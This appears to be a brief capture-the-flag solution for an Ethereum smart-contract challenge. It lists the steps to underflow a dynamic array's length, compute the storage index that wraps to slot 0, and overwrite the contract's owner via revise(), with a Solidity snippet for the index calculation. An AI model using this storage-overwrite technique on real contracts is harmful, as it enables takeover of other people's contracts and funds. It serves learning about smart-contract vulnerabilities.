1. call makeContact()
2. call retract() will make codex's storage == 2^256 - 1, which equals to total contract's storage
3. the contract has `owner` at slot 0 and codex.length at slot 1
4. calculate index:
    unchecked {
        uint256 index = 0 - uint256(keccak256(abi.encode(1)));
    }
    0 is the index we need and uint256(keccak256(abi.encode(1))) is the slot of the first element in codex
5. call revise() with i == index, _content == abi.encode("your address")

//https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/


















